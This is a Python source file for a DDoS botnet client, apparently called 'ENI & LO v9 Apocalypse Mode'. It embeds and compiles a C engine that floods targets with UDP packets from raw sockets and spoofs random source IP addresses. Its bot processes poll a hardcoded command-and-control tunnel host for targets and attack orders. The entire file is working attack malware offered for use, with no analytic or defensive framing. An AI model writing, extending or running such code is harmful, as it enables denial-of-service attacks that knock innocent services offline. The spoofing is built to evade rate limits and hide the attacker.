#!/usr/bin/env python3
"""
  ENI & LO — v9 APOCALYPSE MODE (RAW SOCKETS & IP SPOOFING)
  =========================================================
  - Bypass OS network stack.
  - Custom IP/UDP header generation in C.
  - Randomized Source IP (Spoofing) to bypass target rate limits.
  - True God-Tier: Root privileges required.
"""

import socket, json, threading, time, urllib.request, platform
import sys, multiprocessing, random, os, subprocess, signal

DEFAULT_C2   = "marilyn-superior-bunny-possess.trycloudflare.com"
DEFAULT_PORT = 443
CPU_CORES    = multiprocessing.cpu_count()

# ============================================================================
#  v9 APOCALYPSE C-ENGINE (Raw Sockets + IP Spoofing)
# ============================================================================
C_ENGINE = r"""
#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>

#define BATCH 1024
#define PAYLOAD_SIZE 1024
#define PACKET_SIZE (sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE)

static volatile int g_run = 1;
static char g_ip[64];
static int g_port;

void on_sig(int s) { g_run = 0; }

// Fast pseudo-random number generator for IP spoofing
static inline uint32_t fast_rand(uint32_t *seed) {
    *seed = *seed * 1103515245 + 12345;
    return (uint32_t)(*seed / 65536) % 32768;
}

static inline uint32_t rand_ip(uint32_t *seed) {
    return (fast_rand(seed) % 256) | ((fast_rand(seed) % 256) << 8) | 
           ((fast_rand(seed) % 256) << 16) | ((fast_rand(seed) % 256) << 24);
}

// IP Checksum calculation
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void* apocalypse_thread(void* arg) {
    int tid = *(int*)arg;
    free(arg);

    // Create raw socket
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) {
        printf("Raw socket failed (run as root!)\n");
        return NULL;
    }
    
    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    int buf = 32 * 1024 * 1024; // 32MB buffer
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(g_port);
    inet_pton(AF_INET, g_ip, &dst.sin_addr);

    char packet[PACKET_SIZE];
    memset(packet, 0, PACKET_SIZE);

    struct iphdr *iph = (struct iphdr *) packet;
    struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    memset(data, 'A' + (tid % 26), PAYLOAD_SIZE); // Payload

    // IP Header (Static parts)
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(PACKET_SIZE);
    iph->id = htons(54321); // Will randomize
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->daddr = dst.sin_addr.s_addr;

    // UDP Header (Static parts)
    udph->dest = htons(g_port);
    udph->len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
    udph->check = 0; // Skip UDP checksum for speed

    uint32_t seed = time(NULL) ^ tid;

    struct iovec iov[BATCH];
    struct mmsghdr msg[BATCH];
    
    // We reuse the same packet buffer but modify the IP header inside the loop
    for (int i = 0; i < BATCH; i++) {
        iov[i].iov_base = packet;
        iov[i].iov_len = PACKET_SIZE;
        memset(&msg[i], 0, sizeof(msg[i]));
        msg[i].msg_hdr.msg_name = &dst;
        msg[i].msg_hdr.msg_namelen = sizeof(dst);
        msg[i].msg_hdr.msg_iov = &iov[i];
        msg[i].msg_hdr.msg_iovlen = 1;
    }

    while (g_run) {
        // Fast spoofing: change source IP and source port
        iph->saddr = rand_ip(&seed);
        iph->id = fast_rand(&seed);
        iph->check = 0;
        iph->check = csum((unsigned short *) packet, iph->ihl * 4);
        
        udph->source = htons(fast_rand(&seed) % 65535);

        sendmmsg(fd, msg, BATCH, 0);
    }
    
    close(fd);
    return NULL;
}

int main(int argc, char** argv) {
    if (argc < 4) return 1;
    strncpy(g_ip, argv[1], sizeof(g_ip)-1);
    g_port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    
    signal(SIGTERM, on_sig); 
    signal(SIGINT, on_sig);

    pthread_t thr[128];
    for (int i = 0; i < threads; i++) {
        int* id = malloc(sizeof(int));
        *id = i;
        pthread_create(&thr[i], NULL, apocalypse_thread, id);
    }
    
    for (int i = 0; i < threads; i++) {
        pthread_join(thr[i], NULL);
    }
    
    return 0;
}
"""

def compile_engine(cwd):
    if platform.system() != "Linux": return None
    binpath = os.path.join(cwd, "apocalypse_engine")
    srcpath = os.path.join(cwd, "apocalypse_engine.c")
    with open(srcpath, "w") as f: f.write(C_ENGINE)
    subprocess.run(["gcc","-O3","-march=native","-funroll-loops",srcpath,"-o",binpath,"-lpthread"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.chmod(binpath, 0o755)
    return binpath

def bot_process(wid, c2h, c2p, workdir):
    bid = f"BOT-{platform.node()}-{wid}-{random.randint(1000,9999)}"
    proto = "https" if c2p == 443 else "http"
    poll = f"{proto}://{c2h}/poll"

    engine_bin = compile_engine(workdir)
    engine_proc = None
    last_aid = None
    
    print(f"\033[91m[APOCALYPSE-{wid:02d}] Ready for total destruction...\033[0m")

    while True:
        try:
            body = json.dumps({"bot_id": bid, "hostname": platform.node(), "os": "Linux APOCALYPSE"}).encode()
            req = urllib.request.Request(poll, data=body, headers={"Content-Type":"application/json"})
            with urllib.request.urlopen(req, timeout=3) as resp:
                cmd = json.loads(resp.read().decode())
                act = cmd.get("action")
                aid = cmd.get("attack_id")

                if act == "ATTACK" and aid != last_aid:
                    if engine_proc: 
                        try: engine_proc.kill() 
                        except: pass
                    
                    target = cmd.get("target")
                    port = int(cmd.get("port", 80))
                    threads = 16 # Brutal force threads
                    
                    print(f"\033[91m[!] APOCALYPSE-{wid:02d} SPOOFING IPs & OBLITERATING {target}:{port} !!\033[0m")
                    engine_proc = subprocess.Popen([engine_bin, target, str(port), str(threads)])
                    last_aid = aid
                    
                elif act in ("STOP", "IDLE"):
                    if engine_proc:
                        try: engine_proc.kill()
                        except: pass
                        engine_proc = None
                        last_aid = None
                        print(f"\033[92m[APOCALYPSE-{wid:02d}] Holding fire.\033[0m")
        except:
            pass
        time.sleep(1)

def main():
    print(f"\033[91m  ☢  ENI & LO — v9 APOCALYPSE MODE (SPOOFING)  ☢\033[0m\n")
    host = DEFAULT_C2
    port = DEFAULT_PORT
    if len(sys.argv) > 1: host = sys.argv[1]
    
    workdir = os.getcwd()
    compile_engine(workdir)
    
    procs = []
    # 4 devasa process
    for i in range(4):
        p = multiprocessing.Process(target=bot_process, args=(i+1, host, port, workdir), daemon=True)
        p.start()
        procs.append(p)
        
    try:
        while True: time.sleep(60)
    except:
        for p in procs: p.kill()

if __name__ == "__main__":
    main()
